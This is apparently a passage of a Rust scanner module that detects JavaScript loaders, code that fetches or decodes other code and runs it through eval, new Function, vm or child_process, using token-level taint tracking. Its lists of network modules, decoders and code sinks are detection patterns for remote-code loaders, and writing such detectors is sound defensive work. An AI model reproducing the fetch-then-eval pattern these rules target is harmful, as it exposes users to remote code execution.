//! The JavaScript loader rules: code that fetches, decodes or hides other
//! code and runs it.
//!
//! - `run.js-fetch-eval`: a dynamic code sink (`eval`, `new Function`,
//!   `Function(...)()`, `vm.runIn*`, `module._compile`) whose argument comes
//!   from a network call (`axios`, `fetch`, `http(s).get/request`, `got`, ...)
//!   in the same file. CRITICAL. A call the check cannot follow, or a file it
//!   cannot read to the end, while the file makes network calls, is MEDIUM and
//!   says "review it by hand".
//! - `run.js-function-require`: `new Function("require", ...)` called with
//!   `require`, the usual shape of a loader. CRITICAL.
//! - `obfuscation.encoded-payload-sink`: a decoder (`atob`,
//!   `Buffer.from(x, "base64" | "hex")`, `unescape`, `String.fromCharCode`), a
//!   long base64 string or a run of `\x` escapes handed to a code or command
//!   sink. HIGH.
//!
//! The flow checks use the lexer (`js_lex`) and follow data by name, ignoring
//! scopes: a name that receives network data anywhere in the file is tainted
//! everywhere in it. Taint passes through assignments, destructuring,
//! compound assignment, parameters of callbacks given to a call whose callee
//! chain touches a tainted value (`.then(r => ...)`, `.catch(err => ...)`,
//! `res.on("data", chunk => ...)`), the parameter of a `catch` whose `try`
//! block touched one, and the return value of a function that returns one. It
//! does not follow data across files, through object fields by name, or
//! through `Array` methods other than a callback's parameters (gaps listed in
//! `docs/DETECTIONS.md`).
//!
//! Everything is linear in the size of the file: the lexer is one pass, the
//! passes over the tokens are few and a step budget stops a hostile file.

use std::borrow::Cow;
use std::collections::{HashMap, HashSet};
use std::sync::LazyLock;

use regex::Regex;

use super::js_lex::{self, Kind, Lexed};
use super::{Ctx, Hit, TextSpan};
use crate::finding::Severity;

const NET: u8 = 1;
const BLOB: u8 = 2;

/// What the flow analysis found, before it is turned into a `Hit`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum FoundKind {
    FetchEval,
    FunctionRequire,
    /// The check could not follow something; review it by hand.
    Uncertain,
    /// The file has more tokens than are read; the rest was matched by text.
    Truncated,
    Encoded,
}

#[derive(Debug, Clone)]
pub(crate) struct Found {
    pub kind: FoundKind,
    pub start: usize,
    pub end: usize,
    pub reason: String,
    /// The file writes no URL, so what it fetches is not visible in it: the
    /// level is one below the rule's (`run.js-fetch-eval` only).
    pub lowered: bool,
}

#[derive(Debug, Clone, Default)]
struct Taint {
    bits: u8,
    /// What the data came from, for the explanation (`axios.get`, `atob`).
    net: Option<String>,
    blob: Option<String>,
}

impl Taint {
    fn net(label: String) -> Self {
        Taint {
            bits: NET,
            net: Some(label),
            blob: None,
        }
    }

    fn blob(label: &str) -> Self {
        Taint {
            bits: BLOB,
            net: None,
            blob: Some(label.to_string()),
        }
    }

    /// Adds `other`; true if `self` learned something.
    fn merge(&mut self, other: &Taint) -> bool {
        let before = (self.bits, self.net.is_some(), self.blob.is_some());
        self.bits |= other.bits;
        if self.net.is_none() {
            self.net.clone_from(&other.net);
        }
        if self.blob.is_none() {
            self.blob.clone_from(&other.blob);
        }
        before != (self.bits, self.net.is_some(), self.blob.is_some())
    }
}

/// A name and the token where it is bound or assigned, which tells which
/// variable of that name is meant (see `Flow::resolve`).
type Bound = (String, usize);

#[derive(Clone, Copy, PartialEq, Eq)]
enum SinkClass {
    /// Runs JavaScript.
    Code,
    /// Runs a command line.
    Command,
}

/// Modules whose functions fetch data over the network.
const NET_MODULES: &[&str] = &[
    "axios",
    "got",
    "node-fetch",
    "cross-fetch",
    "isomorphic-fetch",
    "undici",
    "ky",
    "bent",
    "phin",
    "centra",
    "needle",
    "superagent",
    "request",
    "request-promise",
    "request-promise-native",
    "follow-redirects",
    "http",
    "https",
    "http2",
    "node:http",
    "node:https",
    "node:http2",
];

const NET_METHODS: &[&str] = &[
    "get", "post", "put", "patch", "delete", "del", "head", "options", "request", "fetch",
    "stream", "json", "text",
];

const CHILD_PROCESS: &[&str] = &["child_process", "node:child_process"];
const VM_MODULES: &[&str] = &["vm", "node:vm"];

/// Words after which `name(` is a control statement, not a function.
const CONTROL: &[&str] = &[
    "if", "for", "while", "switch", "catch", "function", "with", "return", "typeof", "await",
    "yield", "new", "in", "of", "case", "do", "else", "throw", "delete", "void",
];

/// A file with none of these words cannot hold a dynamic code or command
/// sink; `\u` and `\x` are listed because a name can be written with them.
const SINK_WORDS: &[&str] = &[
    "eval",
    "Function",
    "runIn",
    "compile",
    "exec",
    "spawn",
    "constructor",
    "Script",
    "global",
    "window",
    "self",
    "this[",
    "\\u",
    "\\x",
];

/// The scope of a name declared at the top of the file.
const FILE_SCOPE: usize = usize::MAX - 1;

/// Most tokens an expression is followed through.
const MAX_EXPR_TOKENS: usize = 1000;

/// Passes over the tokens before the taint is taken as final.
const MAX_PASSES: usize = 5;

/// The flow findings of one file's text.
pub(crate) fn flow(text: &str) -> Vec<Found> {
    if !SINK_WORDS.iter().any(|word| text.contains(word)) {
        return Vec::new();
    }
    let lexed = js_lex::lex(text);
    Flow::new(text, &lexed).run()
}

struct Flow<'a> {
    text: &'a str,
    lx: &'a Lexed,
    /// The taint of each variable, by name and by the start of the scope that
    /// declares it (`usize::MAX` for a name nothing declares).
    names: HashMap<(String, usize), Taint>,
    tainted_names: HashSet<String>,
    /// For each name, the blocks (the index of their `{`, or `u32::MAX` for the
    /// file) in which a `const`, `let`, `var` or function declaration binds it.
    decl_blocks: HashMap<String, HashSet<u32>>,
    /// For each name, the token ranges in which a parameter binds it, sorted by
    /// their start: a function's parameters and body, a `catch` clause.
    decl_ranges: HashMap<String, Vec<(usize, usize)>>,
    /// The innermost `{` around each token, `u32::MAX` outside any.
    enclosing: Vec<u32>,
    net_alias: HashSet<String>,
    net_fn: HashSet<String>,
    sink_alias: HashMap<String, SinkClass>,
    cp_alias: HashSet<String>,
    cp_fn: HashSet<String>,
    steps: usize,
    budget: usize,
    over_budget: bool,
    found: Vec<Found>,
}

impl<'a> Flow<'a> {
    fn new(text: &'a str, lx: &'a Lexed) -> Self {
        Flow {
            text,
            lx,
            names: HashMap::new(),
            tainted_names: HashSet::new(),
            decl_blocks: HashMap::new(),
            decl_ranges: HashMap::new(),
            enclosing: Vec::new(),
            net_alias: HashSet::new(),
            net_fn: HashSet::new(),
            sink_alias: HashMap::new(),
            cp_alias: HashSet::new(),
            cp_fn: HashSet::new(),
            steps: 0,
            budget: lx.tokens.len().saturating_mul(60).saturating_add(200_000),
            over_budget: false,
            found: Vec::new(),
        }
    }

    // ------------------------------------------------------------ helpers

    fn n(&self) -> usize {
        self.lx.tokens.len()
    }

    fn kind(&self, i: usize) -> Option<Kind> {
        self.lx.tokens.get(i).map(|t| t.kind)
    }

    fn name(&self, i: usize) -> Option<Cow<'a, str>> {
        let token = self.lx.tokens.get(i)?;
        if token.kind != Kind::Ident {
            return None;
        }
        let raw = self.lx.raw(self.text, i);
        Some(if token.escaped {
            Cow::Owned(js_lex::decode_escapes(raw))
        } else {
            Cow::Borrowed(raw)
        })
    }

    fn is_id(&self, i: usize, word: &str) -> bool {
        self.lx.is_ident(self.text, i, word)
    }

    fn punct(&self, i: usize, b: u8) -> bool {
        self.lx.is_punct(i, b)
    }

    fn str_val(&self, i: usize) -> Option<String> {
        self.lx.str_value(self.text, i)
    }

    fn partner(&self, i: usize) -> Option<usize> {
        self.lx.partner(i)
    }

    fn prev_dot(&self, i: usize) -> bool {
        i > 0 && self.punct(i - 1, b'.')
    }

    fn is_global_obj(&self, i: usize) -> bool {
        self.name(i)
            .is_some_and(|n| matches!(&*n, "window" | "global" | "globalThis" | "self"))
    }

    /// An identifier that names a variable or function here: not a property
    /// after a dot, unless the object is the global one.
    fn is_reference(&self, i: usize) -> bool {
        !self.prev_dot(i) || (i >= 2 && self.is_global_obj(i - 2))
    }

    /// Counts a step; false once the budget is spent.
    fn tick(&mut self) -> bool {
        self.steps += 1;
        if self.steps > self.budget {
            self.over_budget = true;
        }
        !self.over_budget
    }

    fn add(&mut self, kind: FoundKind, i: usize, reason: String) {
        let token = self.lx.tokens[i];
        self.found.push(Found {
            kind,
            start: token.start as usize,
            end: token.end as usize,
            reason,
            lowered: false,
        });
    }

    // ------------------------------------------------------------ bindings

    /// Records what `require` and `import` bind to: network modules, the
    /// child process module and `vm`.
    fn bind_pass(&mut self) {
        for i in 0..self.n() {
            if !self.tick() {
                return;
            }
            if self.is_id(i, "require")
                && self.punct(i + 1, b'(')
                && self.kind(i + 2) == Some(Kind::Str)
                && self.punct(i + 3, b')')
                && let Some(module) = self.str_val(i + 2)
            {
                self.bind_require(i, &module);
            } else if self.is_id(i, "import") && !self.punct(i + 1, b'(') && !self.prev_dot(i) {
                self.bind_import(i);
            }
        }
    }

    fn bind_require(&mut self, at: usize, module: &str) {
        let net = NET_MODULES.contains(&module);
        let cp = CHILD_PROCESS.contains(&module);
        let vm = VM_MODULES.contains(&module);
        if !(net || cp || vm) {
            return;
        }
        // `const X = require(...)`, maybe with `await` or parentheses between.
        let mut j = at;
        while j > 0 && (self.is_id(j - 1, "await") || self.punct(j - 1, b'(')) {
            j -= 1;
        }
        if j == 0 || !self.punct(j - 1, b'=') {
            return;
        }
        let end = j.saturating_sub(2);
        if self.kind(end) == Some(Kind::Ident) {
            if let Some(name) = self.name(end) {
                let name = name.into_owned();
                if net {
                    self.net_alias.insert(name.clone());
                }
                if cp {
                    self.cp_alias.insert(name);
                }
            }
        } else if self.punct(end, b'}')
            && let Some(open) = self.partner(end)
        {
            for (name, _) in self.pattern_names(open, end) {
                if net {
                    self.net_fn.insert(name.clone());
                }
                if cp {
                    self.cp_fn.insert(name.clone());
                }
                if vm {
                    self.sink_alias.insert(name, SinkClass::Code);
                }
            }
        }
    }

    fn bind_import(&mut self, at: usize) {
        let mut j = at + 1;
        let mut in_braces = false;
        let mut default: Vec<String> = Vec::new();
        let mut named: Vec<String> = Vec::new();
        while j < self.n() && j < at + 80 {
            if self.is_id(j, "from") && self.kind(j + 1) == Some(Kind::Str) {
                let Some(module) = self.str_val(j + 1) else {
                    return;
                };
                let net = NET_MODULES.contains(&module.as_str());
                let cp = CHILD_PROCESS.contains(&module.as_str());
                let vm = VM_MODULES.contains(&module.as_str());
                for name in default {
                    if net {
                        self.net_alias.insert(name.clone());
                    }
                    if cp {
                        self.cp_alias.insert(name);
                    }
                }
                for name in named {
                    if net {
                        self.net_fn.insert(name.clone());
                    }
                    if cp {
                        self.cp_fn.insert(name.clone());
                    }
                    if vm {
                        self.sink_alias.insert(name, SinkClass::Code);
                    }
                }
                return;
            }
            if self.punct(j, b'{') {
                in_braces = true;
            } else if self.punct(j, b'}') {
                in_braces = false;
            } else if let Some(name) = self.name(j)
                && !matches!(&*name, "as" | "type" | "from")
                && !self.is_id(j + 1, "as")
            {
                if in_braces {
                    named.push(name.into_owned());
                } else {
                    default.push(name.into_owned());
                }
            } else if self.punct(j, b';') || self.kind(j) == Some(Kind::Str) {
                return;
            }
            j += 1;
        }
    }

    // ------------------------------------------------------------ taint of values

    /// Whether token `k` starts a network call, and what to call it.
    fn net_head(&self, k: usize) -> Option<String> {
        let name = self.name(k)?;
        if !self.is_reference(k) {
            return None;
        }
        let call = self.punct(k + 1, b'(');
        let method = || -> Option<String> {
            if self.punct(k + 1, b'.') {
                let m = self.name(k + 2)?;
                NET_METHODS.contains(&&*m).then(|| m.into_owned())
            } else {
                None
            }
        };
        match &*name {
            "fetch" if call => Some("fetch".to_string()),
            "XMLHttpRequest" if k > 0 && self.is_id(k - 1, "new") => {
                Some("XMLHttpRequest".to_string())
            }
            "axios" => {
                if call {
                    Some("axios".to_string())
                } else {
                    method().map(|m| format!("axios.{m}"))
                }
            }
            "$" | "jQuery" => {
                let m = self
                    .punct(k + 1, b'.')
                    .then(|| self.name(k + 2))
                    .flatten()?;
                matches!(&*m, "get" | "post" | "ajax" | "getJSON").then(|| format!("{name}.{m}"))
            }
            "require" => {
                if !(self.punct(k + 1, b'(')
                    && self.kind(k + 2) == Some(Kind::Str)
                    && self.punct(k + 3, b')'))
                {
                    return None;
                }
                let module = self.str_val(k + 2)?;
                if !NET_MODULES.contains(&module.as_str()) {
                    return None;
                }
                if self.punct(k + 4, b'(') {
                    Some(module)
                } else if self.punct(k + 4, b'.') {
                    let m = self.name(k + 5)?;
                    NET_METHODS.contains(&&*m).then(|| format!("{module}.{m}"))
                } else {
                    None
                }
            }
            other => {
                if self.net_alias.contains(other) {
                    if call {
                        Some(other.to_string())
                    } else {
                        method().map(|m| format!("{other}.{m}"))
                    }
                } else if self.net_fn.contains(other) && call {
                    Some(other.to_string())
                } else {
                    None
                }
            }
        }
    }

    /// Whether the call whose `(` is at `open` has `least` arguments or more, or
    /// spreads one.
    fn many_args(&self, open: usize, least: usize) -> bool {
        let Some(close) = self.partner(open) else {
            return false;
        };
        let mut count = 1;
        let mut k = open + 1;
        while k < close {
            if self.punct(k, b'.') && self.punct(k + 1, b'.') && self.punct(k + 2, b'.') {
                return true;
            }
            if self.punct(k, b',') {
                count += 1;
            }
            k = match self.partner(k).filter(|_| self.is_open(k)) {
                Some(end) => end + 1,
                None => k + 1,
            };
        }
        count >= least
    }

    /// Where the first argument of the call at `open` ends.
    fn first_arg_end(&self, open: usize, close: usize) -> usize {
        let mut k = open + 1;
        while k < close && !self.punct(k, b',') {
            k = match self.partner(k).filter(|_| self.is_open(k)) {
                Some(end) => end + 1,
                None => k + 1,
            };
        }
        k.min(close)
    }

    /// The decoder the identifier at `k` starts, if it is one.
    fn decoder(&self, k: usize) -> Option<&'static str> {
        let name = self.name(k)?;
        match &*name {
            "atob" if self.punct(k + 1, b'(') => Some("atob"),
            "unescape" if self.punct(k + 1, b'(') => Some("unescape"),
            "String"
                if self.punct(k + 1, b'.')
                    && self.is_id(k + 2, "fromCharCode")
                    && self.punct(k + 3, b'(')
                    && self.many_args(k + 3, 8) =>
            {
                Some("String.fromCharCode with many codes")
            }
            "Buffer" => {
                let open = if self.punct(k + 1, b'.')
                    && self.is_id(k + 2, "from")
                    && self.punct(k + 3, b'(')
                {
                    k + 3
                } else if self.punct(k + 1, b'(') && k > 0 && self.is_id(k - 1, "new") {
                    k + 1
                } else {
                    return None;
                };
                let close = self.partner(open)?;
                let encoded = (open + 1..close).any(|j| {
                    self.str_val(j).is_some_and(|v| {
                        matches!(
                            v.as_str(),
                            "base64" | "base64url" | "hex" | "latin1" | "binary"
                        )
                    })
                });
                encoded.then_some("Buffer.from with a base64 or hex string")
            }
            _ => None,
        }
    }

    fn ident_taint(&self, k: usize) -> Option<Taint> {
        if !self.is_reference(k) {
            return None;
        }
        if let Some(label) = self.net_head(k) {
            return Some(Taint::net(label));
        }
        if let Some(label) = self.decoder(k) {
            return Some(Taint::blob(label));
        }
        let name = self.name(k)?;
        if !self.tainted_names.contains(&*name) {
            return None;
        }
        let scope = self.resolve(&name, k);
        // `a` is tainted: so is `a.b.c`. `a.b` is tainted: so is `a.b.c`, but not
        // `a.d` and not `a`.
        let mut path = name.into_owned();
        let mut at = k;
        for _ in 0..5 {
            if let Some(taint) = self.names.get(&(path.clone(), scope)) {
                return Some(taint.clone());
            }
            if !self.punct(at + 1, b'.') {
                break;
            }
            let Some(next) = self.name(at + 2) else {
                break;
            };
            path.push('.');
            path.push_str(&next);
            at += 2;
        }
        None
    }

    /// Which variable named `name` the token `at` means: the scope that declares
    /// it and surrounds `at` most closely (the index of the token that starts
    /// the scope), `FILE_SCOPE` for a declaration at the top of the file, or
    /// `usize::MAX` for a global or an undeclared name.
    fn resolve(&self, path: &str, at: usize) -> usize {
        // `a.b` is a property of the variable `a`.
        let name = path.split('.').next().unwrap_or(path);
        let mut best: Option<usize> = None;
        if let Some(list) = self.decl_ranges.get(name) {
            let upto = list.partition_point(|range| range.0 <= at);
            best = list[..upto]
                .iter()
                .rev()
                .take(16)
                .find(|range| at <= range.1)
                .map(|range| range.0);
        }
        if let Some(blocks) = self.decl_blocks.get(name) {
            let mut block = self.enclosing.get(at).copied().unwrap_or(u32::MAX);
            for _ in 0..256 {
                if blocks.contains(&block) {
                    let scope = if block == u32::MAX {
                        FILE_SCOPE
                    } else {
                        block as usize
                    };
                    // The scope that starts later is the inner one; the top of the
                    // file is the outermost.
                    let rank = |scope: usize| if scope == FILE_SCOPE { 0 } else { scope + 1 };
                    if best.is_none_or(|found| rank(scope) > rank(found)) {
                        best = Some(scope);
                    }
                    break;
                }
                if block == u32::MAX {
                    break;
                }
                block = self.enclosing[block as usize];
            }
        }
        best.unwrap_or(usize::MAX)
    }

    /// The innermost `{` around every token.
    fn compute_enclosing(&mut self) {
        let mut stack: Vec<u32> = Vec::new();
        self.enclosing = Vec::with_capacity(self.n());
        for i in 0..self.n() {
            self.enclosing
                .push(stack.last().copied().unwrap_or(u32::MAX));
            if self.punct(i, b'{') {
                stack.push(i as u32);
            } else if self.punct(i, b'}') {
                stack.pop();
            }
        }
    }

    fn declare_in_block(&mut self, name: String, block: u32) {
        self.decl_blocks.entry(name).or_default().insert(block);
    }

    fn declare_in_range(&mut self, name: String, start: usize, end: usize) {
        self.decl_ranges.entry(name).or_default().push((start, end));
    }

    /// Records where names are declared, so that a name means one variable at a
    /// time and not every variable of that name in the file (a bundle holds
    /// thousands of functions whose parameter is called `e`).
    fn collect_decls(&mut self) {
        let n = self.n();
        for d in 0..n {
            if !self.tick() {
                return;
            }
            let block = self.enclosing[d];
            let Some(word) = self.name(d) else {
                if self.punct(d, b'=') && self.punct(d + 1, b'>') && self.lx.adjacent(d + 1) {
                    self.declare_arrow(d);
                } else if self.punct(d, b'(') && d > 0 {
                    self.declare_method(d);
                }
                continue;
            };
            if self.prev_dot(d) {
                continue;
            }
            match &*word {
                "const" | "let" | "var" => {
                    let mut k = d + 1;
                    for _ in 0..64 {
                        let (names, next) = match self.kind(k) {
                            Some(Kind::Ident) => match self.name(k) {
                                Some(name) => (vec![(name.into_owned(), k)], k + 1),
                                None => break,
                            },
                            Some(Kind::Punct(b'{' | b'[')) => match self.partner(k) {
                                Some(end) => (self.pattern_names(k, end), end + 1),
                                None => break,
                            },
                            _ => break,
                        };
                        for (name, _) in names {
                            self.declare_in_block(name, block);
                        }
                        let end = if self.punct(next, b'=') {
                            self.expr_end(next + 1)
                        } else {
                            next
                        };
                        if self.punct(end, b',') {
                            k = end + 1;
                        } else {
                            break;
                        }
                    }
                }
                "function" => {
                    let mut p = d + 1;
                    if let Some(name) = self.name(p)
                        && self.punct(p + 1, b'(')
                    {
                        self.declare_in_block(name.into_owned(), block);
                        p += 1;
                    }
                    self.declare_params(p);
                }
                "catch" if self.punct(d + 1, b'(') => self.declare_params(d + 1),
                _ => {}
            }
        }
        for list in self.decl_ranges.values_mut() {
            list.sort_unstable();
            list.dedup();
        }
    }

    /// The parameters in the parentheses at `p`, scoped to the braces after
    /// them (a function body, a `catch` block).
    fn declare_params(&mut self, p: usize) {
        if !self.punct(p, b'(') {
            return;
        }
        let Some(close) = self.partner(p) else {
            return;
        };
        let end = if self.punct(close + 1, b'{') {
            self.partner(close + 1).unwrap_or(self.n())
        } else {
            close
        };
        for (name, _) in self.param_list(p, close) {
            self.declare_in_range(name, p, end);
        }
    }

    /// `name(params) {`: a method.
    fn declare_method(&mut self, p: usize) {
        let Some(name) = self.name(p - 1) else {
            return;
        };
        if CONTROL.contains(&&*name) || !self.partner(p).is_some_and(|c| self.punct(c + 1, b'{')) {
            return;
        }
        self.declare_params(p);
    }

    /// The parameters of the arrow function whose `=>` starts at `at`.
    fn declare_arrow(&mut self, at: usize) {
        let (names, start) = if at > 0 && self.punct(at - 1, b')') {
            match self.partner(at - 1) {
                Some(open) => (self.param_list(open, at - 1), open),
                None => return,
            }
        } else if let Some(name) = self.name(at.saturating_sub(1)) {
            (vec![(name.into_owned(), at - 1)], at - 1)
        } else {
            return;
        };
        let end = if self.punct(at + 2, b'{') {
            self.partner(at + 2).unwrap_or(self.n())
        } else {
            self.expr_end(at + 2)
        };
        for (name, _) in names {
            self.declare_in_range(name, start, end);
        }
    }

    /// The taint of the tokens `a..b`: what flows into an expression written
    /// there.
    fn range_taint(&mut self, a: usize, b: usize) -> Taint {
        let mut taint = Taint::default();
        let end = b.min(self.n());
        for k in a..end {
            if !self.tick() {
                break;
            }
            match self.kind(k) {
                Some(Kind::Ident) => {
                    if let Some(t) = self.ident_taint(k) {
                        taint.merge(&t);
                    }
                }
                Some(Kind::Str) => {
                    if let Some(label) = blob_literal(self.lx.raw(self.text, k)) {
                        taint.merge(&Taint::blob(label));
                    }
                }
                _ => {}
            }
        }
        taint
    }

    /// The taint along the callee chain that ends at token `k`
    /// (`axios.get(u).then` for the call `.then(...)`).
    fn chain_taint(&mut self, k: usize) -> Taint {
        let mut taint = Taint::default();
        let mut j = k;
        for _ in 0..200 {
            if !self.tick() {
                break;
            }
            match self.kind(j) {
                Some(Kind::Ident) => {
                    if let Some(t) = self.ident_taint(j) {
                        taint.merge(&t);
                    }
                    if j >= 2 && self.punct(j - 1, b'.') {
                        // `?.` has the question mark first.
                        j -= if j >= 3 && self.punct(j - 2, b'?') {
                            3
                        } else {
                            2
                        };
                    } else {
                        break;
                    }
                }
                Some(Kind::Punct(b')' | b']')) => match self.partner(j) {
                    Some(open) if open > 0 => j = open - 1,
                    _ => break,
                },
                _ => break,
            }
        }
        taint
    }

    // ------------------------------------------------------------ statements

    fn is_assign(&self, j: usize) -> bool {
        if !self.punct(j, b'=') {
            return false;
        }
        if (self.punct(j + 1, b'=') || self.punct(j + 1, b'>')) && self.lx.adjacent(j + 1) {
            return false;
        }
        if j > 0
            && self.lx.adjacent(j)
            && let Some(Kind::Punct(prev)) = self.kind(j - 1)
        {
            return !matches!(prev, b'=' | b'!' | b'<' | b'>');
        }
        true
    }

    /// The names an assignment whose `=` is at `j` gives a value to.
    fn lhs_names(&self, j: usize) -> Vec<Bound> {
        let mut p = j.saturating_sub(1);
        while p > 0
            && self.lx.adjacent(p + 1)
            && matches!(
                self.kind(p),
                Some(Kind::Punct(
                    b'+' | b'-' | b'*' | b'/' | b'%' | b'&' | b'|' | b'^' | b'?'
                ))
            )
        {
            p -= 1;
        }
        match self.kind(p) {
            Some(Kind::Ident) => self.base_name(p).into_iter().collect(),
            Some(Kind::Punct(b']')) => {
                let Some(open) = self.partner(p) else {
                    return Vec::new();
                };
                if open > 0
                    && matches!(
                        self.kind(open - 1),
                        Some(Kind::Ident | Kind::Punct(b')' | b']'))
                    )
                {
                    self.base_name(open - 1).into_iter().collect()
                } else {
                    self.pattern_names(open, p)
                }
            }
            Some(Kind::Punct(b'}')) => match self.partner(p) {
                Some(open) => self.pattern_names(open, p),
                None => Vec::new(),
            },
            _ => Vec::new(),
        }
    }

    /// The path of the chain `a.b[c].d` that ends at `p`, as far as it is plain
    /// names and dots (`a.b`), with the token of its first name.
    fn base_name(&self, mut p: usize) -> Option<Bound> {
        let mut segments: Vec<String> = Vec::new();
        for _ in 0..100 {
            match self.kind(p) {
                Some(Kind::Ident) => {
                    segments.push(self.name(p)?.into_owned());
                    if p >= 2 && self.punct(p - 1, b'.') {
                        p -= 2;
                    } else {
                        segments.reverse();
                        return Some((segments.join("."), p));
                    }
                }
                Some(Kind::Punct(b')' | b']')) => {
                    // What follows an index or a call is not part of the path.
                    segments.clear();
                    let open = self.partner(p)?;
                    if open == 0 {
                        return None;
                    }
                    p = open - 1;
                }
                _ => return None,
            }
        }
        None
    }

    /// The names bound by a destructuring pattern between `open` and `close`.
    fn pattern_names(&self, open: usize, close: usize) -> Vec<Bound> {
        let mut names = Vec::new();
        for k in open + 1..close {
            let Some(name) = self.name(k) else { continue };
            let after_separator = k > 0
                && matches!(
                    self.kind(k - 1),
                    Some(Kind::Punct(b'{' | b'[' | b',' | b':'))
                );
            if after_separator && !self.punct(k + 1, b':') && !matches!(&*name, "async" | "await") {
                names.push((name.into_owned(), k));
            }
            if names.len() >= 64 {
                break;
            }
        }
        names
    }

    /// Where the expression that starts at `from` ends (exclusive).
    fn expr_end(&self, from: usize) -> usize {
        let limit = (from + MAX_EXPR_TOKENS).min(self.n());
        let mut k = from;
        while k < limit {
            match self.kind(k) {
                Some(Kind::Punct(b';' | b',')) => return k,
                Some(Kind::Punct(b')' | b']' | b'}')) => return k,
                Some(Kind::Punct(b'(' | b'[' | b'{')) => match self.partner(k) {
                    Some(close) => {
                        k = close + 1;
                        if k < limit && self.new_statement(k) {
                            return k;
                        }
                        continue;
                    }
                    None => return k,
                },
                _ => {}
            }
            k += 1;
            if k < limit && self.new_statement(k) {
                return k;
            }
        }
        limit
    }

    /// Whether a line break before token `k` ends a statement (automatic
    /// semicolon insertion, as far as it matters here).
    fn new_statement(&self, k: usize) -> bool {
        let Some(token) = self.lx.tokens.get(k) else {
            return false;
        };
        if !token.nl_before || k == 0 {
            return false;
        }
        let starts = match token.kind {
            Kind::Number | Kind::Str => true,
            Kind::Ident => !matches!(self.lx.raw(self.text, k), "in" | "of" | "instanceof" | "as"),
            _ => false,
        };
        let ends = match self.lx.tokens[k - 1].kind {
            Kind::Number | Kind::Str | Kind::Regex | Kind::Template => true,
            Kind::Ident => !matches!(
                self.lx.raw(self.text, k - 1),
                "typeof"
                    | "new"
                    | "await"
                    | "delete"
                    | "void"
                    | "in"
                    | "of"
                    | "instanceof"
                    | "return"
                    | "throw"
                    | "yield"
                    | "case"
                    | "do"
                    | "else"
            ),
            Kind::Punct(b')' | b']' | b'}') => true,
            Kind::Punct(_) => false,
        };
        starts && ends
    }

    /// Whether a function expression starts at `k`.
    fn starts_function(&self, mut k: usize) -> bool {
        if self.is_id(k, "async") {
            k += 1;
        }
        if self.is_id(k, "function") {
            return true;
        }
        let arrow =
            |p: usize| self.punct(p, b'=') && self.punct(p + 1, b'>') && self.lx.adjacent(p + 1);
        if self.punct(k, b'(') {
            return self.partner(k).is_some_and(|close| arrow(close + 1));
        }
        self.kind(k) == Some(Kind::Ident) && arrow(k + 1)
    }

    /// The taint of what a function expression that starts at `k` returns.
    fn fn_return_taint(&mut self, k: usize) -> Taint {
        let mut k = k;
        if self.is_id(k, "async") {
            k += 1;
        }
        let body_open = if self.is_id(k, "function") {
            let mut p = k + 1;
            while p < self.n() && !self.punct(p, b'(') {
                p += 1;
                if p > k + 4 {
                    return Taint::default();
                }
            }
            let Some(close) = self.partner(p) else {
                return Taint::default();
            };
            close + 1
        } else {
            let after = if self.punct(k, b'(') {
                match self.partner(k) {
                    Some(close) => close + 1,
                    None => return Taint::default(),
                }
            } else {
                k + 1
            };
            // Past `=` and `>`.
            after + 2
        };
        if self.punct(body_open, b'{') {
            match self.partner(body_open) {
                Some(close) => self.returns_taint(body_open, close),
                None => Taint::default(),
            }
        } else {
            let end = self.expr_end(body_open);
            self.range_taint(body_open, end)
        }
    }

    /// The taint of the values returned between `open` and `close`.
    fn returns_taint(&mut self, open: usize, close: usize) -> Taint {
        let mut taint = Taint::default();
        for k in open + 1..close {
            if !self.tick() {
                break;
            }
            if self.is_id(k, "return") && !self.prev_dot(k) {
                let end = self.expr_end(k + 1);
                let t = self.range_taint(k + 1, end);
                taint.merge(&t);
            }
        }
        taint
    }

    fn taint_names(&mut self, names: &[Bound], taint: &Taint) -> bool {
        let mut changed = false;
        if taint.bits == 0 {
            return false;
        }
        for (name, at) in names {
            let scope = self.resolve(name, *at);
            self.tainted_names
                .insert(name.split('.').next().unwrap_or(name).to_string());
            let entry = self.names.entry((name.clone(), scope)).or_default();
            changed |= entry.merge(taint);
        }
        changed
    }

    fn assign_pass(&mut self) -> bool {
        let mut changed = false;
        for j in 1..self.n() {
            if !self.tick() {
                break;
            }
            if !self.is_assign(j) {
                continue;
            }
            let names = self.lhs_names(j);
            if names.is_empty() {
                continue;
            }
            // `const run = eval;`
            if let [(name, _)] = names.as_slice()
                && !name.contains('.')
                && let Some(class) = self.sink_reference(j + 1)
            {
                self.sink_alias.entry(name.clone()).or_insert(class);
            }
            // `const api = axios.create(...)`
            if let [(name, _)] = names.as_slice()
                && !name.contains('.')
                && self.is_net_factory(j + 1)
                && self.net_alias.insert(name.clone())
            {
                changed = true;
            }
            let taint = if self.starts_function(j + 1) {
                self.fn_return_taint(j + 1)
            } else {
                let end = self.expr_end(j + 1);
                self.range_taint(j + 1, end)
            };
            changed |= self.taint_names(&names, &taint);
        }
        changed
    }

    /// `eval`, `Function`, `window.eval` and similar written without a call.
    fn sink_reference(&self, k: usize) -> Option<SinkClass> {
        let mut at = k;
        if self.is_global_obj(at) && self.punct(at + 1, b'.') {
            at += 2;
        }
        let name = self.name(at)?;
        let bare =
            |end: usize| !(self.punct(end, b'(') || self.punct(end, b'.') || self.punct(end, b'['));
        match &*name {
            "eval" | "Function" if bare(at + 1) => Some(SinkClass::Code),
            "execSync" | "exec" if bare(at + 1) && self.cp_fn.contains(&*name) => {
                Some(SinkClass::Command)
            }
            _ => None,
        }
    }

    /// `axios.create(...)`, `got.extend(...)`: an object that makes requests.
    fn is_net_factory(&self, k: usize) -> bool {
        let Some(head) = self.name(k) else {
            return false;
        };
        let known = head == "axios" || self.net_alias.contains(&*head);
        known
            && self.punct(k + 1, b'.')
            && self
                .name(k + 2)
                .is_some_and(|m| matches!(&*m, "create" | "extend" | "default"))
    }

    /// `function name(...) { ... return tainted; }` and methods.
    fn function_pass(&mut self) -> bool {
        let mut changed = false;
        for i in 1..self.n() {
            if !self.tick() {
                break;
            }
            if !self.punct(i, b'(') {
                continue;
            }
            let Some(name) = self.name(i - 1) else {
                continue;
            };
            if CONTROL.contains(&&*name) {
                continue;
            }
            let Some(close) = self.partner(i) else {
                continue;
            };
            if !self.punct(close + 1, b'{') {
                continue;
            }
            let Some(body_close) = self.partner(close + 1) else {
                continue;
            };
            let taint = self.returns_taint(close + 1, body_close);
            changed |= self.taint_names(&[(name.into_owned(), i - 1)], &taint);
        }
        changed
    }

    /// The parameter names of the function written at `s`, if one is.
    fn function_params(&self, s: usize) -> Option<Vec<Bound>> {
